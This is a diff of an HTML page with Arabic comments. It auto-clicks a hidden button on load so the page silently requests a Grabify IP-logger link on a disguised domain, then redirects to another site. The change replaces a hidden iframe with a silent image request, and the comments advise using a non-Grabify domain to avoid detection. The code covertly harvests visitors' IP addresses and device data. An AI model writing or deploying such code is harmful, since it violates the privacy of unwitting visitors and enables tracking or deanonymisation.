@@ -7,39 +7,32 @@
 </head>
 <body>
 
-  <!-- زر مخفي تماماً عن عين المستخدم -->
-  <button id="autoBtn" style="display:none; width:0; height:0; visibility:hidden;"></button>
+  <!-- زر افتراضي مخفي تماماً -->
+  <button id="secureBtn" style="display:none; width:0; height:0; visibility:hidden;"></button>
 
   <script>
-    // 1. انتظر حتى يتم تحميل هيكل الصفحة بالكامل
     document.addEventListener("DOMContentLoaded", function() {
-      const btn = document.getElementById('autoBtn');
+      const btn = document.getElementById('secureBtn');
       
-      // 2. برمجة ماذا سيحدث عندما يتم الضغط على الزر
       btn.addEventListener('click', function() {
-        // توليد متغير عشوائي لكسر الكاش والحظر المكرر في كل مرة
-        const cacheBuster = Math.floor(Math.random() * 999999);
+        // توليد طابع زمني فريد بالملي ثانية لمنع السيرفر والمتصفح من قراءة الكاش القديم
+        const timestamp = Date.now();
         
-        // ⚠️ استبدل هذا الرابط برابط Grabify الجديد (ويُفضل بنطاق بديل غير grabify.link)
-        const grabifyUrl = 'https://photospace.life/JLMB8N' + cacheBuster; 
+        // ⚠️ استبدل هذا الرابط برابطك الجديد (بالنطاق البديل الذي اخترته)
+        const grabifyUrl = 'https://stopify.co/JLMB8N' + timestamp; 
         const destinationUrl = 'https://dominoes.mx';
 
-        // إنشاء إطار (iframe) برمجياً ليعطي الـ Smart Logger بيئة متصفح كاملة
-        const iframe = document.createElement('iframe');
-        iframe.style.display = "none";
-        iframe.style.width = "0px";
-        iframe.style.height = "0px";
-        iframe.style.border = "none";
-        iframe.src = grabifyUrl;
-        document.body.appendChild(iframe);
+        // استخدام كائن الصورة برمجياً لإرسال الطلب بصمت تام وبأعلى صلاحية أمان
+        const imgTracker = new Image();
+        imgTracker.src = grabifyUrl;
 
-        // 3. منح الـ Smart Logger مهلة (ثانية ونصف) لجمع بيانات الجهاز والـ IP ثم التوجيه
+        // مهلة 1.8 ثانية كافية جداً ليعالج السيرفر الـ Smart Logger والـ IP قبل إعادة التوجيه
         setTimeout(function() {
           window.location.href = destinationUrl;
-        }, 1500);
+        }, 1800);
       });
 
-      // 4. إجبار المتصفح على ضغط الزر أوتوماتيكياً فوراً بدون تدخل المستخدم
+      // إطلاق النقرة أوتوماتيكياً فور تحميل الصفحة
       btn.click();
     });
   </script>
